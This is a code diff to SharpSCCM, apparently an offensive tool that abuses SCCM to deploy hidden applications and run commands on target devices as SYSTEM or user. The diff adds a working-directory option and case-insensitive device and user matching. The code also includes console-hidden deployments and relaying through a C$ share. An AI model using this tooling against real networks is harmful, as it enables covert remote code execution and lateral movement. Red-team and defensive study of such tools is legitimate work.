@@ -9,7 +9,7 @@ namespace SharpSCCM
 {
     public static class SmsProviderWmi
     {
-        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null, int waitTime = 300)
+        public static void Exec(ManagementScope wmiConnection, string collectionId = null, string collectionName = null, string deviceName = null, string applicationPath = null, string workingDir = null, string relayServer = null, string resourceId = null, bool runAsUser = true, string collectionType = null, string userName = null, int waitTime = 300)
         {
             ManagementObject collection = null;
             if (!string.IsNullOrEmpty(collectionName) || !string.IsNullOrEmpty(collectionId))
@@ -37,7 +37,7 @@ namespace SharpSCCM
             string newDeploymentName = $"{newApplicationName}_{(string)collection["CollectionID"]}_Install";
             applicationPath = !string.IsNullOrEmpty(relayServer) ? $"\\\\{relayServer}\\C$" : applicationPath;
             // Hide from ConfigMgr Console by default
-            NewApplication(wmiConnection, newApplicationName, applicationPath, runAsUser, false);
+            NewApplication(wmiConnection, newApplicationName, applicationPath, workingDir, runAsUser, false);
             NewDeployment(wmiConnection, newApplicationName, null, (string)collection["CollectionID"]);
             Console.WriteLine("[+] Waiting for new deployment to become available...");
             bool deploymentAvailable = false;
@@ -722,7 +722,7 @@ namespace SharpSCCM
             Exec(wmiConnection, deviceName: deviceName, applicationPath: commandToExecute, runAsUser: false, collectionType: "device");
         }
 
-        public static ManagementObject NewApplication(ManagementScope wmiConnection, string name, string path, bool runAsUser = false, bool show = false)
+        public static ManagementObject NewApplication(ManagementScope wmiConnection, string name, string path, string workingDir = null, bool runAsUser = false, bool show = false)
         {
             ManagementObject application = null;
 
@@ -808,7 +808,7 @@ namespace SharpSCCM
                                 <Provider>Script</Provider>
                                 <Args>
                                     <Arg Name=""InstallCommandLine"" Type=""String"">{path}</Arg>
-                                    <Arg Name=""WorkingDirectory"" Type=""String""/>
+                                    <Arg Name=""WorkingDirectory"" Type=""String"">{workingDir}</Arg>
                                     <Arg Name=""ExecutionContext"" Type=""String"">{(runAsUser ? "User" : "System")}</Arg>
                                     <Arg Name=""RequiresLogOn"" Type=""String""/>
                                     <Arg Name=""RequiresElevatedRights"" Type=""Boolean"">false</Arg>
@@ -1037,13 +1037,17 @@ namespace SharpSCCM
                                 {
                                     foreach (ManagementObject member in collectionMembers)
                                     {
-                                        if ((!string.IsNullOrEmpty(deviceName) && (string)member.GetPropertyValue("Name") == deviceName) ||
-                                        (!string.IsNullOrEmpty(userName) && member.GetPropertyValue("Name").ToString().Contains(userName)) ||
+                                        if ((!string.IsNullOrEmpty(deviceName) && member.GetPropertyValue("Name").ToString().ToLower() == deviceName.ToLower()) ||
+                                        (!string.IsNullOrEmpty(userName) && member.GetPropertyValue("Name").ToString().ToLower().Contains(userName.ToLower())) ||
                                         (!string.IsNullOrEmpty(resourceId) && (uint)member.GetPropertyValue("ResourceID") == Convert.ToUInt32(resourceId)))
                                         {
                                             Console.WriteLine($"[+] Successfully added {matchingResource["Name"]} ({matchingResource["ResourceID"]}) to {(!string.IsNullOrEmpty(collectionName) ? collectionName : collectionId)}");
                                             memberAvailable = true;
                                             collectionMember = collectionMembers.Cast<ManagementObject>().First();
+                                        }
+                                        else
+                                        {
+                                            Console.WriteLine($"[+] Member {member.GetPropertyValue("Name").ToString()} did not match the specified resource");
                                         }
                                     }
                                 }
